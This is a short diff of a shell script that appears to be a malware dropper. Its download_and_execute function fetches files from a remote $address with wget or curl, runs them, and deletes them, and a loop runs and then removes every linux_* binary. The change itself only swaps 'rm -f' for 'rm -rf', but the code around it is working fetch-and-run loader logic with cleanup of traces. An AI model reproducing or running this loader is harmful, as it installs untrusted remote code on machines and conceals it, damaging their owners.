@@ -3,7 +3,7 @@
 download_and_execute() {
     local file_name=$1
     local url="https://$address/$file_name"
-    rm -f "$file_name"
+    rm -rf "$file_name"
     if wget -t 1 "$url"; then
         :
     elif curl --connect-timeout 10 "$url"; then
@@ -18,7 +18,7 @@ download_and_execute() {
     if ./$file_name; then
         :
     else
-        rm -f "$file_name"
+        rm -rf "$file_name"
     fi
 }
 
@@ -68,6 +68,6 @@ rm -f web.sh
 for file in linux_*; do
     if [ -f "$file" ]; then
         ./$file
-        rm -f "$file"
+        rm -rf "$file"
     fi
 done
